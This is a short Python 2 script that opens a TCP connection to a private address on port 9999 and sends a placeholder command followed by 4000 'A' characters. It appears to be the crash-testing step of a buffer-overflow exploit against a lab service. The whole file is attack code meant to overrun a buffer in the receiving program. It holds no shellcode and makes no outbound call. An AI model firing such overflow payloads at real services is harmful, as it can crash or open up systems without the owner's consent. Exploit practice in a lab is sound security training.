import socket
host = "192.168.1.227"
port = 9999

buf = "A" * 4000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((host,port))
	data = s.recv(1024)
	print "\n" + data
	s.send("<command to run> /" + buf + "\r\n")
except:
	print "Something Happened!"

s.close()
print "Buffer of ", len(buf), " Sent Successfully!"
